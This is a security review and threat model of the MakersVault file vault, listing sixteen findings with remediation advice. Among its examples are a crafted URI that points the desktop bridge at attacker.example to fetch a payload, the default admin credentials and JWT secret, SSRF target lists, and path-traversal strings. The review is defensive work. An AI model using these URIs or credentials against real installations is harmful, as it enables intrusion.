# MakersVault v5.1 Security Analysis

**Project:** MakersVault
**Repository:** `GhostLabs-ent/MakersVault`
**Reviewed branch:** `main`
**Repository snapshot reviewed:** `80ddc5bb8849c0532ecf4de91010e450df28b940`
**Review date:** 2026-08-13
**Review type:** Source-code security review / threat-model assessment
**Target release:** v5.1

---

> **Gate 0 revalidation notice:** This document is the original review snapshot,
> not the current finding ledger. The working tree has since moved production web
> serving to unprivileged Nginx, multi-user work has been explicitly deferred from
> v5.1, and repository/CI controls have changed. Current dispositions and scan
> evidence are recorded in
> [security/GATE_0_REVALIDATION.md](security/GATE_0_REVALIDATION.md).

## Executive Summary

MakersVault has a reasonable security foundation for a self-hosted beta application, but there are several issues that should be addressed before v5.1 is positioned for broad Internet exposure, multi-user deployments, or a future hosted/cloud service.

The code already contains several good security decisions:

- Most sensitive API routes require authentication.
- SQLModel is used instead of constructing SQL queries from raw user input.
- Uploaded/imported filenames are sanitized.
- ZIP extraction rejects parent-directory traversal components.
- Remote import URLs reject obvious loopback, private, link-local, reserved, multicast, and credential-bearing targets before the initial request.
- Mounted-file serving checks that resolved source paths remain inside the configured import root.
- API and web containers drop root privileges before starting the application.
- React renders user-controlled notes, titles, tags, and filenames through normal JSX rather than raw HTML.
- The desktop bridge redacts the `token` query parameter from its own logs.

However, the current architecture has several important trust-boundary problems.

### Highest-priority findings

1. **Desktop bridge can download and open arbitrary HTTP/HTTPS content supplied through the custom URI handler.**
2. **Default administrator credentials and JWT signing secret are embedded as runtime fallbacks.**
3. **Remote import SSRF protection can be bypassed through redirect/DNS-resolution behavior unless every network hop is validated before connection.**
4. **`python-multipart==0.0.9` is affected by multiple known multipart denial-of-service vulnerabilities.**
5. **`Pillow==10.4.0` is affected by a high-severity crafted-PSD memory-corruption vulnerability and MakersVault processes user-controlled images with Pillow.**
6. **Direct uploads have no application-level size limit, and ZIP extraction has no aggregate decompression budget.**
7. **Authentication tokens are persisted in `localStorage` and appended to asset URLs as query parameters.**
8. **The production web container runs the Vite development server rather than serving a static production build.**
9. **Mount-copy mode can follow file symlinks outside the configured import root.**
10. **The current authentication model is not sufficient for the planned v5.1 multi-user feature because authorization/RBAC does not yet exist.**

### Overall release assessment

**Current posture:** acceptable for a trusted single-user/LAN beta when deployed carefully.

**Not recommended yet for:**

- Direct unrestricted Internet exposure.
- Untrusted multi-user environments.
- Public hosted/cloud instances.
- Environments where the desktop bridge can be invoked by arbitrary web content without additional validation.

The P0 findings below should be treated as part of the v5.1 release gate.

---

# 1. Scope and Methodology

This review focused on the security-sensitive portions of the current MakersVault repository:

```text
makervault/api/
├── auth.py
├── main.py
├── asset_service.py
├── config.py
├── db.py
├── file_utils.py
├── import_service.py
├── import_resolvers.py
├── mount_import.py
├── schemas.py
├── settings_service.py
├── url_utils.py
└── zip_service.py

makervault/web/
├── Dockerfile
├── docker-entrypoint.sh
├── package.json
├── package-lock.json
├── vite.config.js
└── src/
    ├── lib/
    │   ├── api.ts
    │   └── auth.ts
    └── ui/
        ├── AssetGrid.tsx
        ├── LightBurnPreview.tsx
        ├── Login.tsx
        └── ModelViewer.tsx

makervault/slicer-bridge/
└── cmd/slicer-bridge/
    ├── main.go
    └── install_windows.go

Docker deployment files
```

The review considered:

- Authentication and session management.
- Authorization and future multi-user isolation.
- File upload handling.
- ZIP/archive handling.
- Filesystem boundaries.
- Remote imports and SSRF.
- Browser security.
- Custom URI handlers.
- Desktop application launching.
- Container security.
- Dependency/supply-chain risk.
- Denial-of-service exposure.
- Future cloud-hosting implications.

This was a **source review**, not a penetration test.

The following were not performed:

- Live exploit testing.
- Network scanning.
- Dynamic application scanning.
- Fuzzing.
- Container image scanning.
- Full transitive dependency audit.
- Runtime configuration review of a deployed instance.

Those should be added before a hosted MakersVault service is launched.

---

# 2. Threat Model

## Protected Assets

MakersVault potentially protects:

- User CAD files.
- STL / STEP / 3MF files.
- LightBurn projects.
- Images and artwork.
- Future PCB/CNC project files.
- Private project notes.
- Authentication credentials.
- Session/JWT tokens.
- MakerWorld and Thingiverse session cookies supplied for imports.
- Mounted NAS/shared-folder contents.
- Local filesystem paths.
- Future cloud backups.
- Future user/project metadata.
- The desktop workstation running the slicer bridge.
- Local slicers, LightBurn, and other configured applications.

## Relevant Threat Actors

### Unauthenticated remote attacker

May attempt to:

- Guess credentials.
- Exhaust CPU, RAM, or disk.
- Exploit dependency vulnerabilities.
- Abuse a publicly reachable web/API service.
- Invoke custom URI handlers through malicious web pages.

### Authenticated malicious user

Becomes important with v5.1 multi-user support.

May attempt to:

- Access another user's assets.
- Delete or rename other users' files.
- Abuse remote URL imports for SSRF.
- Consume server storage.
- Submit malicious archives or model files.
- Manipulate administrative settings.

### Malicious file/model author

A model downloaded from a public repository may intentionally contain:

- Parser exploits.
- ZIP bombs.
- Extremely complex geometry.
- Malicious embedded images.
- Unexpected archive structures.

### Malicious remote import server

May attempt:

- Redirects to internal addresses.
- DNS rebinding.
- Excessive response sizes.
- Cookie theft.
- Slow responses.
- Malicious archive delivery.

### Malicious website

May attempt to invoke:

```text
makersvault-slicer://
makersvault-engrave://
```

and use the desktop bridge as a path from the browser into the operating system.

### Compromised dependency/build environment

May target:

- npm packages.
- Python packages.
- Go toolchain.
- Docker base images.
- Prebuilt bridge binaries.

---

# 3. Trust Boundaries

MakersVault currently crosses several important trust boundaries.

```text
Internet / LAN
      │
      ▼
Browser
      │
      ▼
MakersVault Web UI
      │
      ▼
FastAPI
      │
      ├──────────────► Local/NAS filesystem
      │
      └──────────────► Internet import targets

Browser
      │
      ▼
Custom URI Scheme
      │
      ▼
MakersVault Slicer Bridge
      │
      ├──────────────► Internet / MakersVault API
      │
      └──────────────► Local desktop applications
```

The **desktop bridge boundary is especially important** because it turns browser-controlled input into filesystem writes and application launches.

---

# 4. Findings Summary

| ID | Finding | Severity | v5.1 Priority |
|---|---|---:|---:|
| MV-SEC-001 | Desktop bridge accepts arbitrary download URLs and can open downloaded files | **High / Potentially Critical** | **P0** |
| MV-SEC-002 | Default admin password and JWT signing secret | **High** | **P0** |
| MV-SEC-003 | Remote-import SSRF redirect/DNS validation gap | **High for hosted/multi-user; Medium today** | **P0** |
| MV-SEC-004 | Vulnerable `python-multipart==0.0.9` | **High** | **P0** |
| MV-SEC-005 | Vulnerable `Pillow==10.4.0` image parser | **High** | **P0** |
| MV-SEC-006 | Unlimited direct uploads / aggregate ZIP expansion | **High Availability Risk** | **P0** |
| MV-SEC-007 | JWTs placed in query strings | **Medium** | **P0/P1** |
| MV-SEC-008 | JWT persisted in browser `localStorage` | **Medium** | **P1** |
| MV-SEC-009 | No login throttling or session revocation | **Medium** | **P1** |
| MV-SEC-010 | Vite development server used as deployment server | **Medium** | **P0/P1** |
| MV-SEC-011 | Mount-copy mode can follow symlinks outside import root | **Medium** | **P1** |
| MV-SEC-012 | Multi-user feature lacks authorization architecture | **High if multi-user ships as-is** | **P0** |
| MV-SEC-013 | ZIP download paths use unsanitized folder names | **Low today / Medium when sharing** | **P1** |
| MV-SEC-014 | Client-side archive/model parsing can be resource exhausted | **Medium** | **P1** |
| MV-SEC-015 | Security headers / trusted-host policy not enforced by app | **Low/Medium** | **P1** |
| MV-SEC-016 | Repository/build supply-chain hygiene needs improvement | **Low/Medium** | **P1/P2** |

---

# 5. Detailed Findings

## MV-SEC-001 — Desktop Bridge Accepts Arbitrary URLs and Opens Downloaded Content

**Severity:** High / potentially Critical
**Priority:** P0
**Component:** `makervault/slicer-bridge/cmd/slicer-bridge/main.go`

### Description

The bridge registers custom URI schemes:

```text
makersvault-slicer://
makersvault-engrave://
```

The protocol handler accepts a query parameter named `url`.

The only URL restriction is that it begins with:

```text
http://
```

or:

```text
https://
```

The bridge then:

1. Downloads the remote content.
2. Writes it to a local cache/download directory.
3. Opens the file in the selected application.
4. If no configured application is selected, calls the OS default opener.

There is currently no strong restriction that:

- The URL belongs to the configured MakersVault instance.
- The URL identifies an actual MakersVault asset.
- The file extension is a safe maker-file extension.
- The download size is bounded.
- The custom URI request was generated by a trusted MakersVault server.
- The request is fresh or single-use.

### Why this matters

A malicious webpage may be able to construct a URI such as:

```text
makersvault-slicer://open?url=https://attacker.example/payload&filename=...
```

If the operating system/browser permits the protocol handler to launch, the bridge will process attacker-controlled download information.

The risk becomes significantly higher when the default OS opener is used.

The bridge should be treated as a **local privilege boundary**, not merely a convenience helper.

### Recommended Remediation

Do not pass arbitrary remote URLs through the custom protocol.

Prefer:

```text
makersvault-slicer://open
    ?asset=<asset-id>
    &tool=orca
    &ticket=<short-lived-ticket>
```

The bridge should have a configured MakersVault server origin:

```text
https://vault.example.com
```

and build the download endpoint itself.

The ticket should:

- Expire in approximately 30–60 seconds.
- Be bound to one asset.
- Be bound to the bridge action.
- Be single-use if practical.
- Be signed by the MakersVault server.

Example conceptual claims:

```json
{
  "aud": "makersvault-bridge",
  "asset_id": "...",
  "action": "open",
  "exp": "...",
  "jti": "..."
}
```

Also enforce a strict file-extension allowlist.

For slicers:

```text
.stl
.3mf
.step
.stp
.obj
```

For engraving:

```text
.lbrn
.lbrn2
.svg
.dxf
.ai
.eps
.pdf
.png
.jpg
.jpeg
.bmp
```

Explicitly deny executable/script types such as:

```text
.exe
.com
.scr
.msi
.bat
.cmd
.ps1
.vbs
.js
.jse
.hta
.lnk
.url
.dll
```

Additional controls:

- Maximum download size.
- HTTPS by default.
- Exact configured-origin matching.
- No automatic fallback to the OS default opener for unknown file types.
- Optional local confirmation dialog before opening a newly downloaded file.
- Validate final response URL after redirects.
- Do not forward MakersVault authentication tokens to unrelated hosts.

---

## MV-SEC-002 — Default Administrator Credentials and JWT Secret

**Severity:** High
**Priority:** P0
**Components:**

```text
makervault/api/auth.py
makervault/docker-compose.deploy.yml
README deployment examples
```

### Description

The API currently falls back to values equivalent to:

```text
username: admin
password: super-secret
JWT secret: changeme-secret
```

The deployment compose file also supplies default credentials when environment variables are missing.

### Impact

If a user exposes MakersVault without changing these values:

- An attacker can authenticate with known credentials.
- A known JWT signing secret allows token forgery.
- Changing only the password is insufficient if the signing secret remains known.

Because MakersVault documentation supports reverse proxies and public access, assuming that every user will replace every default is unsafe.

### Recommended Remediation

**Fail closed.**

Do not start an Internet-capable deployment with default credentials.

Preferred v5.1 approach:

```text
First Launch
     │
     ▼
Create Administrator
     │
     ▼
Generate random application/session secret
```

Generate at least 256 bits of random secret material.

For example:

```text
32 random bytes minimum
```

If environment-based authentication is retained temporarily:

- Remove real default credentials.
- Require `AUTH_PASSWORD`.
- Require `AUTH_SECRET`.
- Reject known placeholder values.
- Reject very short signing secrets.
- Print a clear startup error instead of silently using insecure defaults.

---

## MV-SEC-003 — Remote Import SSRF Validation Gap

**Severity:** Medium today; High for hosted/multi-user deployments
**Priority:** P0
**Components:**

```text
makervault/api/url_utils.py
makervault/api/import_service.py
makervault/api/import_resolvers.py
```

### Existing Positive Control

The current URL validator correctly blocks many obvious internal targets:

- Private addresses.
- Loopback.
- Link-local.
- Reserved addresses.
- Multicast.
- Unspecified addresses.
- `localhost`.
- `.local` names.
- URLs containing credentials.

That is a good start.

### Remaining Problem

The application validates a hostname/IP before calling `urlopen()`.

However:

- `urlopen()` performs its own network resolution.
- Automatic redirects may occur before MakersVault validates the redirect destination.
- The application validates `resp.geturl()` only **after** the connection has already been made.
- DNS can potentially return a safe address during validation and a private address when the actual request connects.

This creates a classic **TOCTOU/DNS-rebinding SSRF gap**.

### Potential Targets

A successful SSRF could potentially reach services such as:

```text
127.0.0.1
localhost-only services
Docker/internal service networks
NAS management interfaces
router/firewall interfaces
cloud metadata endpoints
other RFC1918 systems
```

### Recommended Remediation

Implement a dedicated safe HTTP client.

Requirements:

1. Disable automatic redirects.
2. Validate every `Location` destination **before** following it.
3. Limit redirects.
4. Strip cookies and authorization headers on cross-origin redirects.
5. Resolve the destination and validate every returned IP.
6. Prefer connecting to the already validated IP rather than resolving again.
7. Apply outbound firewall/egress rules where possible.

For repository-specific resolvers:

- MakerWorld cookie only goes to MakerWorld-approved hosts.
- Thingiverse cookie only goes to Thingiverse-approved hosts.
- Never carry cookies across unrelated redirects.

For future cloud hosting, consider a dedicated import worker running in an isolated network namespace with no access to internal management networks.

---

## MV-SEC-004 — Known Vulnerabilities in `python-multipart==0.0.9`

**Severity:** High
**Priority:** P0
**Component:** `makervault/api/requirements.txt`

The project pins:

```text
python-multipart==0.0.9
```

This release is affected by multiple published multipart parser vulnerabilities.

Relevant advisories include:

```text
CVE-2024-53981 / GHSA-59g5-xgcq-4qw3
CVE-2026-40347 / GHSA-mj87-hwqh-73pj
CVE-2026-42561 / GHSA-pp6c-gr5w-3c5g
```

The 2026 header-parsing issue affects applications using FastAPI/Starlette multipart parsing and can cause CPU exhaustion.

### Recommended Remediation

Upgrade to at least:

```text
python-multipart >= 0.0.31
```

Then run regression tests for:

- Standard uploads.
- Multi-file uploads.
- Drag/drop.
- Folder uploads.
- Large uploads.
- Malformed multipart requests.

Add dependency auditing to CI so this does not depend on manual review.

---

## MV-SEC-005 — Vulnerable Pillow Version Used on User-Controlled Images

**Severity:** High
**Priority:** P0
**Components:**

```text
makervault/api/requirements.txt
makervault/api/asset_service.py
```

The API pins:

```text
Pillow==10.4.0
```

MakersVault calls:

```python
Image.open(...)
convert("RGB")
thumbnail(...)
```

on uploaded/mounted image content.

Pillow versions from `10.3.0` through versions before `12.1.1` are affected by:

```text
CVE-2026-25990
GHSA-cfh3-3jmp-rvhc
```

which concerns an out-of-bounds write while loading a crafted PSD.

### Why it can matter to MakersVault

MakersVault currently decides whether to call Pillow using:

- Client-supplied MIME type.
- Filename extension.

Pillow itself detects the actual file format from file contents.

A malicious file can therefore potentially be disguised with an allowed image filename.

### Recommended Remediation

Upgrade Pillow to a currently patched supported release.

At minimum the PSD issue requires:

```text
Pillow >= 12.1.1
```

For v5.1, use the newest compatible patched release available after regression testing.

Also explicitly limit accepted thumbnail formats:

```python
Image.open(
    path,
    formats=["PNG", "JPEG", "WEBP", "BMP"]
)
```

This prevents Pillow from selecting unrelated parsers based solely on magic bytes.

Also enforce:

- Maximum uploaded image bytes.
- Maximum decoded pixel count.
- Thumbnail timeouts/worker isolation if practical.

---

## MV-SEC-006 — Direct Upload and ZIP Resource Exhaustion

**Severity:** High availability risk
**Priority:** P0
**Components:**

```text
makervault/api/main.py
makervault/api/zip_service.py
makervault/web/src/ui/ModelViewer.tsx
makervault/web/src/ui/LightBurnPreview.tsx
```

### Direct Uploads

Remote imports have an `IMPORT_MAX_BYTES` limit.

The direct `/upload` route does not apply an equivalent maximum.

It continues reading until EOF:

```text
read chunk
write chunk
repeat
```

A sufficiently large upload can consume the entire storage volume.

### ZIP Imports

Server-side ZIP extraction checks the size of each extracted entry.

It does **not** enforce a total uncompressed extraction budget across the complete archive.

An archive containing many individually allowed files can therefore expand to a much larger total size.

### Client-Side Parsing

The browser uses synchronous decompression in several preview paths.

For example:

```text
3MF ZIP decompression
LightBurn ZIP decompression
```

A malicious archive/model can cause browser memory exhaustion or long UI stalls.

### Recommended Limits

Introduce configurable policy values similar to:

```text
MAX_UPLOAD_BYTES
MAX_ARCHIVE_BYTES
MAX_ARCHIVE_ENTRIES
MAX_ARCHIVE_EXPANDED_BYTES
MAX_ARCHIVE_COMPRESSION_RATIO
MAX_IMAGE_PIXELS
MAX_MODEL_BYTES
```

Example starting policies:

```text
single upload: configurable, default 512 MB
archive entries: 10,000 maximum
total expanded archive: configurable, e.g. 2 GB
compression ratio: reject extreme ratios
```

The exact defaults should be adjustable because MakersVault users may legitimately store large CAD files.

Enforce limits in:

- Reverse proxy.
- API streaming layer.
- ZIP extraction.
- Browser preview layer.

Do not rely only on `Content-Length`.

---

## MV-SEC-007 — Authentication Tokens in Query Strings

**Severity:** Medium
**Priority:** P0/P1
**Components:**

```text
makervault/api/auth.py
makervault/web/src/lib/auth.ts
makervault/web/src/lib/api/
```

The API accepts:

```text
?token=<JWT>
```

and the frontend intentionally appends the JWT to file and thumbnail URLs.

### Risk

Secrets in URLs can leak through:

- Browser history.
- Reverse-proxy access logs.
- HTTP server logs.
- Monitoring/APM tools.
- Copied URLs.
- Screenshots.
- Referer headers in some navigation scenarios.
- Desktop bridge command-line arguments.
- Crash reports.

The bridge itself attempts to redact the token in its own logs, which is a good control, but that does not protect every system through which the URL passes.

### Recommended Remediation

Preferred architecture:

```text
HttpOnly secure session cookie
```

or:

```text
Authorization: Bearer <token>
```

For `<img>` elements or other browser resources where setting headers is inconvenient, issue a **short-lived signed asset URL** rather than exposing the primary session token.

Example:

```text
/file/<asset-id>?sig=<asset-ticket>
```

with:

- Very short expiration.
- Asset-specific scope.
- Read-only scope.
- Independent signing/audience from the primary session.

---

## MV-SEC-008 — JWT Stored in `localStorage`

**Severity:** Medium
**Priority:** P1
**Component:** `makervault/web/src/lib/auth.ts`

The primary JWT is stored in:

```text
window.localStorage
```

### Risk

Any successful JavaScript execution in the MakersVault origin can read and exfiltrate the token.

The current React UI does **not** appear to use `dangerouslySetInnerHTML` in the reviewed source, and normal JSX escaping reduces the immediate stored-XSS attack surface.

However, browser-side parsers, dependencies, future plugins, and future features can introduce XSS over time.

### Recommended Remediation

For an Internet-facing application, prefer:

```text
Secure
HttpOnly
SameSite=Lax/Strict
```

cookies with CSRF protection for state-changing operations.

Alternatively:

- Keep short-lived access tokens only in memory.
- Store refresh/session material in an HttpOnly cookie.

---

## MV-SEC-009 — Authentication Brute Force and Session Lifecycle

**Severity:** Medium
**Priority:** P1
**Components:**

```text
makervault/api/main.py
makervault/api/auth.py
```

### Observed Behavior

- No login rate limiting.
- No progressive delay.
- No account lockout policy.
- JWT lifetime defaults to 12 hours.
- Tokens contain no `jti`.
- No server-side revocation/session store.
- Refresh simply produces another JWT from a valid JWT.
- Client logout cannot invalidate an already stolen token.

### Recommended Remediation

For v5.1:

- Rate-limit `/login`.
- Track attempts per IP and username.
- Add progressive delays.
- Emit security audit events.
- Shorten access-token lifetime if JWTs remain.
- Add session identifiers.
- Add server-side revocation for sessions.
- Rotate session identifiers after authentication.
- Allow administrators to invalidate all sessions.

---

## MV-SEC-010 — Vite Development Server Used as Deployment Server

**Severity:** Medium
**Priority:** P0/P1
**Components:**

```text
makervault/web/Dockerfile
makervault/web/vite.config.js
makervault/web/package-lock.json
```

The web Docker image starts:

```text
npm run dev -- --host
```

rather than producing and serving a static production build.

The Vite configuration also defaults to permissive host handling when no explicit allowed-host value exists.

The current lockfile resolves Vite to:

```text
5.4.20
```

Development servers are not ideal production exposure points and Vite has historically had several file-access vulnerabilities specifically tied to exposed dev servers.

### Recommended Remediation

Use a multi-stage image.

Conceptually:

```text
Stage 1
node
npm ci
npm run build

Stage 2
nginx-unprivileged / caddy / equivalent
serve /dist only
```

Do not ship `node_modules`, the TypeScript source tree, or the development server in the final runtime image unless required.

Also explicitly restrict accepted hostnames.

---

## MV-SEC-011 — Mount Import Can Follow Symlinks Outside Root in Copy Mode

**Severity:** Medium
**Priority:** P1
**Component:** `makervault/api/mount_import.py`

### Description

The scanner uses:

```text
path.is_file()
path.stat()
shutil.copyfile()
```

which follow symbolic links.

When `IMPORT_MOUNT_COPY` is enabled, a symlink located inside the configured mount can therefore refer to a file outside that mount and have its target copied into MakersVault.

The later serving path has a root-containment check for mounted source files, but the copy path occurs earlier and does not use the same containment validation.

### Example Scenario

```text
/imports/secret.stl -> /etc/sensitive-file
```

If an attacker can write symlinks into the mounted import directory, MakersVault may copy the target.

### Recommended Remediation

Before importing any mount file:

```python
root = import_root.resolve()
candidate = path.resolve()

if candidate != root and root not in candidate.parents:
    reject
```

Also consider:

```python
path.is_symlink()
```

and simply reject symlinks by default.

Add configuration if users specifically need symlink traversal.

---

## MV-SEC-012 — Multi-User Requires Authorization, Not Just Authentication

**Severity:** High if multi-user ships without redesign
**Priority:** P0
**Components:**

```text
makervault/api/models.py
makervault/api/auth.py
makervault/api/main.py
```

This is especially important for v5.1.

The current authentication dependency essentially answers:

> "Does this request contain a valid JWT?"

It does not produce a strongly typed user principal used for authorization.

The current `Asset` and `Folder` records also have no owner, tenant, project-membership, or ACL fields.

All authenticated API calls operate against the same global asset/folder collection.

### If Multi-User Is Intended as a Shared Vault

Even if all normal users may see all files, administrative boundaries are still required.

At minimum distinguish:

```text
Admin
Member
Read Only
```

Permissions should cover:

```text
read assets
upload assets
modify metadata
delete assets
manage folders
run remote imports
manage mount settings
manage users
manage authentication
view audit logs
```

### Recommended Architecture

Replace:

```python
require_auth() -> token string
```

with:

```text
get_current_user()
       │
       ▼
CurrentPrincipal
├── user_id
├── username
├── roles
└── permissions
```

Then make authorization explicit at every sensitive endpoint.

Consider future entities:

```text
User
Role
ProjectMembership
Session
AuditEvent
```

Do not implement multi-user by simply allowing multiple usernames to receive the same unrestricted JWT privilege.

---

## MV-SEC-013 — ZIP Download Paths Use Folder Names

**Severity:** Low today; Medium in shared environments
**Priority:** P1
**Component:** `makervault/api/main.py`

ZIP downloads build archive paths using the folder's user-controlled name.

Folder names do not currently receive path-component normalization before they are inserted into the ZIP archive name.

A folder name such as:

```text
../../example
```

could therefore produce suspicious archive paths.

This does not write outside the MakersVault server because the issue is in a ZIP being **created**, not extracted.

However, a recipient extracting such a ZIP with a vulnerable archive utility may face ZIP-slip behavior.

### Recommended Remediation

Normalize every archive path component independently.

Reject or replace:

```text
..
/
\
NUL
control characters
```

Always create ZIP member paths from sanitized components rather than concatenating display names.

---

## MV-SEC-014 — Untrusted Model/Archive Parsing in Browser

**Severity:** Medium
**Priority:** P1
**Components:**

```text
makervault/web/src/ui/ModelViewer.tsx
makervault/web/src/ui/LightBurnPreview.tsx
```

MakersVault parses potentially untrusted:

- 3MF.
- STL.
- STEP.
- OBJ.
- LightBurn/ZIP-based content.
- Embedded preview data.

Some decompression/parsing occurs synchronously in the main browser thread.

### Risks

- Browser tab denial of service.
- Excessive memory allocation.
- Excessive geometry creation.
- Dependency-parser vulnerabilities.
- GPU/WebGL resource exhaustion.

### Recommended Remediation

- Do not auto-render every model on initial library load.
- Generate safe cached previews server-side or in bounded workers.
- Parse complex models in Web Workers.
- Cap model file size for preview.
- Cap ZIP expanded bytes.
- Cap number of vertices/triangles where practical.
- Time out preview generation.
- Allow the user to disable automatic preview for problematic files.

This aligns with the existing performance work and improves both performance and security.

---

## MV-SEC-015 — Security Headers and Host Validation

**Severity:** Low/Medium
**Priority:** P1

The application should establish an explicit baseline for browser security headers.

Recommended production headers include:

```text
Content-Security-Policy
X-Content-Type-Options: nosniff
Referrer-Policy
Permissions-Policy
Strict-Transport-Security
frame-ancestors
```

A reasonable CSP starting point could be built around:

```text
default-src 'self'
img-src 'self' blob: data:
worker-src 'self' blob:
connect-src 'self' <configured-api-origin>
object-src 'none'
base-uri 'self'
frame-ancestors 'none'
```

The exact policy must be tested with:

- Three.js.
- WASM.
- OCCT workers.
- blob URLs.
- remote/reverse-proxy configurations.

Also use explicit trusted-host validation at the reverse proxy and/or application level.

---

## MV-SEC-016 — Build and Supply-Chain Hygiene

**Severity:** Low/Medium
**Priority:** P1/P2

The source tree currently contains generated/runtime artifacts including examples such as:

```text
node_modules/
dist/
__pycache__/
*.pyc
app.db
slicer-bridge.exe
```

### Risks

- Generated dependency trees make security review noisy.
- Vendored `node_modules` can drift from the lockfile.
- Runtime databases can accidentally contain user/test information.
- A committed prebuilt executable cannot easily be proven to match source.
- Large generated trees make malicious changes easier to hide in review.

### Recommended Remediation

Source repository:

```text
source code
package-lock.json
requirements
go.mod
build configuration
tests
documentation
```

Release artifacts:

```text
Docker images
bridge binaries
checksums
SBOM
signatures
```

Remove generated/runtime artifacts from Git where possible.

For released bridge binaries:

- Build them in CI.
- Publish SHA-256 checksums.
- Sign releases.
- Consider Sigstore/Cosign.
- Produce an SBOM.
- Make builds reproducible where practical.

---

# 6. Positive Security Controls Already Present

A security review should record what is working well, not only flaws.

## Filename Sanitization

Uploads/imports replace path separators and strip NUL characters before filesystem use.

This significantly reduces basic path traversal risk.

---

## ZIP Extraction Traversal Defense

ZIP entry normalization:

- Removes leading separators.
- Converts backslashes.
- Rejects `..` path components.
- Does not directly call `extractall()` into the storage directory.

This is substantially safer than naive ZIP extraction.

---

## Remote URL Baseline Validation

The URL validator already rejects:

```text
localhost
.local
private IPs
loopback
link-local
reserved
multicast
unspecified
embedded URL credentials
non-http(s) schemes
```

The remaining issue is network-hop validation, not the absence of SSRF thinking.

---

## Mounted Source Containment on Read

When MakersVault serves a non-copied mounted file, it resolves the candidate path and confirms it remains below the configured mount root.

That is a good containment control.

---

## ORM Usage

SQLModel-generated queries are used for user-controlled filters and identifiers.

No obvious SQL-string concatenation vulnerability was identified in the reviewed API paths.

---

## React Output Encoding

Titles, notes, tags, and filenames are rendered as standard JSX text.

No `dangerouslySetInnerHTML` usage was identified in the reviewed source.

That materially reduces ordinary stored-XSS risk.

---

## Non-Root Containers

Both the API and web entrypoints create/select an unprivileged runtime user and then use:

```text
gosu
```

or:

```text
su-exec
```

before starting the application.

This is a strong baseline container practice.

---

## Bridge Logging Redaction

The desktop bridge explicitly redacts the `token` query parameter from the URL it writes to its own logs.

This should be preserved even after the token architecture is redesigned.

---

# 7. Authentication Redesign for v5.1

Because v5.1 is expected to include multi-user/MFA work, this is an ideal time to replace the temporary authentication model.

## Recommended Entities

```text
User
├── id
├── username
├── password_hash
├── enabled
├── created_at
└── last_login

Role
├── admin
├── member
└── read_only

Session
├── id
├── user_id
├── created_at
├── expires_at
├── last_seen
├── revoked_at
└── client metadata

MFACredential
├── user_id
├── type
├── encrypted_secret
└── recovery codes

AuditEvent
├── actor
├── action
├── object
├── timestamp
├── source IP
└── result
```

## Password Storage

Use a modern password hash.

Preferred:

```text
Argon2id
```

Do not store user passwords in plaintext in the database.

Environment variables can remain useful for emergency/bootstrap administration, but should not be the normal persistent user database.

---

# 8. MFA Recommendations

If MFA ships in v5.1:

## TOTP

Suitable first implementation.

Requirements:

- Generate strong random TOTP secret.
- Encrypt the secret at rest.
- Require password re-entry before enrollment.
- Verify one code before enabling MFA.
- Generate recovery codes.
- Hash recovery codes in storage.
- Allow admins to revoke MFA through an auditable recovery workflow.

Future:

```text
WebAuthn / Passkeys
```

would be an excellent upgrade.

---

# 9. Audit Logging

A multi-user security model should have an append-oriented audit trail.

Log events such as:

```text
login success
login failure
logout
MFA enrollment
MFA removal
user creation
user deletion
role change
asset upload
asset delete
asset rename
remote URL import
mount-import setting change
backup creation
restore operation
API key creation
API key revocation
```

Do **not** log:

```text
passwords
JWTs
session cookies
MakerWorld cookies
Thingiverse cookies
MFA secrets
recovery codes
```

---

# 10. Cloud/Hosted MakersVault Security Requirements

If MakersVault Cloud becomes part of the monetization strategy, security requirements increase substantially.

Before hosting multiple customers:

## Tenant Isolation

Every object must be tenant scoped.

Example:

```text
Tenant
  └── User
      └── Project
          └── Artifact
```

Every database query must carry a tenant boundary.

Do not rely only on UI filtering.

---

## Object Storage

Use private buckets.

Do not expose permanent public object URLs.

Use:

```text
short-lived signed download URLs
```

or proxy authenticated downloads.

---

## Backup Encryption

Cloud backups should be:

- Encrypted in transit.
- Encrypted at rest.
- Integrity checked.
- Versioned.
- Recoverable.

A future premium backup offering is much more trustworthy if security is designed before monetization launches.

---

## Import Worker Isolation

Remote imports are an excellent candidate for a separate worker.

The worker should not have network routes to:

- Database management networks.
- Host control panels.
- Docker daemon.
- cloud metadata endpoints.
- internal service networks.

Only allow:

```text
public Internet
object storage
specific queue/API
```

as required.

---

# 11. Container Hardening

Current non-root execution is good.

Additional production options:

```yaml
read_only: true
security_opt:
  - no-new-privileges:true
cap_drop:
  - ALL
tmpfs:
  - /tmp
```

Writable volumes should be limited to:

```text
/app/storage
/app/data
```

where possible.

Also consider:

- Container healthchecks.
- CPU/memory limits.
- PID limits.
- Separate API/web networks.
- Do not expose the API port publicly when a reverse proxy is used.
- Do not mount the Docker socket.
- Pin base images by digest for release builds.

---

# 12. Recommended Security Headers

Example target policy:

```text
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
X-Frame-Options: DENY
```

Prefer CSP `frame-ancestors` over relying solely on `X-Frame-Options`.

When HTTPS is enabled:

```text
Strict-Transport-Security
```

should be added by the reverse proxy after confirming the domain is permanently HTTPS-capable.

---

# 13. Secure File Handling Policy

MakersVault is intentionally a file vault, so file handling deserves a documented policy.

## Store

Files may be stored regardless of preview support.

## Preview

Only preview formats that have explicitly supported parsers.

Example:

```text
PNG
JPEG
WEBP
BMP
STL
STEP
3MF
OBJ
SVG-as-image
LBRN/LBRN2 preview extraction
```

## Execute/Open

A dramatically smaller list should be eligible for desktop launch.

Never treat:

```text
"stored"
```

as equivalent to:

```text
"safe to execute/open automatically"
```

That distinction is particularly important for the desktop bridge.

---

# 14. Security CI/CD Recommendations

Add:

```text
.github/workflows/security.yml
```

Suggested checks:

## Python

```bash
pip-audit
ruff
bandit
```

## Node

```bash
npm ci
npm audit
```

plus Dependabot.

## Go

```bash
go test ./...
govulncheck ./...
```

## Repository

```text
CodeQL
secret scanning
dependency review
```

## Containers

Use one of:

```text
Trivy
Grype
Docker Scout
```

## SBOM

Generate CycloneDX or SPDX SBOMs for release images.

---

# 15. Security Regression Tests

Security controls should become automated tests.

## Authentication

- Default credentials rejected.
- Weak JWT secret rejected.
- Invalid JWT rejected.
- Expired JWT rejected.
- Revoked session rejected.
- Login rate limiter triggers.

## Authorization

- Read-only user cannot delete.
- Member cannot change admin settings.
- User cannot alter another tenant/project if isolation exists.
- Admin actions require admin role.

## Uploads

- Upload greater than configured maximum returns `413`.
- Misleading `Content-Length` does not bypass limit.
- Malformed multipart rejected safely.
- Crafted image does not invoke unsupported Pillow parser.

## ZIP

Test:

```text
../../escape
/absolute/path
